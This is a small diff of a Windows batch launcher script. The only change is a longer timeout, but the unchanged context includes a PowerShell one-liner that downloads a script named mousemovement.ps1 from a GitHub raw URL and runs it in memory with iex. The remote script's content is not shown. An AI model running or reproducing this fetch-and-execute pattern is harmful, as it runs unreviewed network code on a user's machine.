@@ -13,6 +13,6 @@ start /d "C:/Users/Test/Desktop/XX/xx/" start.bat
 timeout /t 6
 
 start cmd.exe /k "powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://github.com/mortingenstrasse95/mng/raw/main/mousemovement.ps1')""
-timeout /t 6
+timeout /t 10
 
 exit
